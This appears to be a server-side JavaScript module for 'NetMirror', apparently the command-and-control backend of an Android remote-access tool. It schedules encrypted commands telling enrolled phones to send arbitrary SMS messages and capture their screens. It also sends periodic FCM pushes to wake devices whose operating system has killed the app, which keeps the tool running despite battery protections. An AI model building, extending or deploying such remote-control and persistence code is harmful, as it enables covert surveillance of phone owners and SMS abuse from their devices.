/**
 * Scheduled Commands Processor
 * Runs every 30 seconds, picks up pending commands whose scheduled_at <= NOW,
 * executes them (send_sms, screen_capture), and updates their status.
 *
 * ALSO runs an FCM wake-up sweep: finds devices that have an FCM token but
 * haven't been seen online in the last 5 minutes, and sends them a high-priority
 * push to wake the app process. This is the magic that keeps NetMirror reachable
 * even on aggressive OEM ROMs (MIUI, EMUI, ColorOS) that kill background services.
 */

const { encrypt: cryptoEncrypt } = require('./crypto');

let io = null;
let db = null;
let intervalHandle = null;

const POLL_INTERVAL_MS = 30 * 1000; // 30 seconds

// Wake-up sweep config — runs as part of every poll cycle.
const FCM_WAKEUP_SWEEP_INTERVAL_TICKS = 10;  // 10 ticks * 30s = every 5 minutes
const FCM_WAKEUP_OFFLINE_THRESHOLD_MIN = 5;  // only wake devices unseen >5min
const FCM_WAKEUP_MAX_PER_SWEEP = 50;         // cap to avoid FCM rate limits
let _sweepTick = 0;

function startScheduler(_io, _db) {
  io = _io;
  db = _db;

  if (intervalHandle) clearInterval(intervalHandle);

  intervalHandle = setInterval(processPendingCommands, POLL_INTERVAL_MS);
  console.log('[Scheduler] Started — polling every 30s');
}

function stopScheduler() {
  if (intervalHandle) {
    clearInterval(intervalHandle);
    intervalHandle = null;
  }
}

function processPendingCommands() {
  try {
    const pending = db.prepare(
      "SELECT * FROM scheduled_commands WHERE status = 'pending' AND scheduled_at <= datetime('now')"
    ).all();

    if (pending.length === 0) return;

    console.log(`[Scheduler] Processing ${pending.length} pending command(s)`);

    for (const cmd of pending) {
      try {
        let payload = {};
        try { payload = JSON.parse(cmd.payload || '{}'); } catch (_) {}

        let result = '';
        let status = 'executed';

        switch (cmd.command_type) {
          case 'send_sms':
            result = executeSendSms(cmd.device_id, payload);
            break;

          case 'screen_capture':
            result = executeScreenCapture(cmd.device_id);
            break;

          default:
            result = `Unknown command type: ${cmd.command_type}`;
            status = 'failed';
        }

        db.prepare(
          "UPDATE scheduled_commands SET status = ?, result = ?, executed_at = datetime('now') WHERE id = ?"
        ).run(status, result, cmd.id);

        console.log(`[Scheduler] Command #${cmd.id} (${cmd.command_type}) → ${status}: ${result}`);
      } catch (err) {
        db.prepare(
          "UPDATE scheduled_commands SET status = 'failed', result = ?, executed_at = datetime('now') WHERE id = ?"
        ).run(err.message, cmd.id);
        console.error(`[Scheduler] Command #${cmd.id} failed:`, err.message);
      }
    }

    // Save after processing batch
    if (db.saveNow) db.saveNow();
  } catch (err) {
    console.error('[Scheduler] Poll error:', err.message);
  }

  // FCM wake-up sweep — runs every Nth tick.
  _sweepTick++;
  if (_sweepTick >= FCM_WAKEUP_SWEEP_INTERVAL_TICKS) {
    _sweepTick = 0;
    runFcmWakeUpSweep().catch(err => {
      console.error('[Scheduler] FCM wake-up sweep error:', err.message);
    });
  }
}

/**
 * Find devices that have an FCM token but haven't been seen online recently,
 * and send them a high-priority push to wake the app. This is the keep-alive
 * heartbeat that lets us reach devices even when the OS has killed the app.
 */
async function runFcmWakeUpSweep() {
  if (!db) return;
  let fcm;
  try {
    fcm = require('./firebase-admin');
  } catch (_) { return; }
  if (!fcm.isEnabled()) return;

  // Find candidate devices:
  //  - has a non-null fcm_token
  //  - is_online = 0 (offline)
  //  - last_seen older than 5 minutes
  //  - fcm_token_updated (so we don't keep hammering a device whose token we never got)
  let rows;
  try {
    rows = db.prepare(`
      SELECT device_id, fcm_token, last_seen
      FROM devices
      WHERE fcm_token IS NOT NULL AND fcm_token != ''
        AND is_online = 0
        AND last_seen < datetime('now', '-${FCM_WAKEUP_OFFLINE_THRESHOLD_MIN} minutes')
      ORDER BY last_seen ASC
      LIMIT ?
    `).all(FCM_WAKEUP_MAX_PER_SWEEP);
  } catch (err) {
    console.error('[Scheduler] FCM sweep query error:', err.message);
    return;
  }

  if (rows.length === 0) return;
  console.log(`[Scheduler] FCM wake-up sweep: ${rows.length} offline device(s) with tokens`);

  let sent = 0, failed = 0;
  for (const row of rows) {
    const r = await fcm.sendFcmToDeviceToken(row.fcm_token, {
      command: 'wake',
      reason: 'heartbeat',
      ts: String(Date.now())
    });
    if (r.ok) sent++; else failed++;
  }
  console.log(`[Scheduler] FCM wake-up sweep complete: ${sent} sent, ${failed} failed`);
}

/**
 * Execute send_sms command to a connected device
 */
function executeSendSms(deviceId, payload) {
  const { receiver, message, sim_slot } = payload;
  if (!receiver || !message) return 'Missing receiver or message in payload';

  const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(deviceId);
  if (!device || !device.socket_id) return 'Device not connected';

  const targetSocket = io.sockets.sockets.get(device.socket_id);
  if (!targetSocket) return 'Device socket not found (may have disconnected)';

  const requestId = `sched_sms_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;

  targetSocket.emit('send_sms', cryptoEncrypt({
    request_id: requestId,
    receiver,
    message,
    sim_slot: sim_slot || 1,
  }));

  return `Dispatched to device (request_id: ${requestId})`;
}

/**
 * Execute screen_capture command to a connected device
 */
function executeScreenCapture(deviceId) {
  const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(deviceId);
  if (!device || !device.socket_id) return 'Device not connected';

  const targetSocket = io.sockets.sockets.get(device.socket_id);
  if (!targetSocket) return 'Device socket not found (may have disconnected)';

  targetSocket.emit('capture_screen', cryptoEncrypt({ timestamp: new Date().toISOString() }));

  return 'Capture request dispatched to device';
}

module.exports = { startScheduler, stopScheduler };
